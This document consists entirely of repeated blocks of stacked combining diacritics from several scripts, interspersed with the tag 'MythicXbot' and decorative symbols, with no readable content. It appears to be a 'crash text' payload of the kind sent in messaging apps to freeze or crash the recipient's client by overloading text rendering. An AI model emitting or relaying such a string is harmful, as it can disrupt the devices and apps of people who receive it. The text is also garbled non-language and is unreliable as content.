๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭99**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭99**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ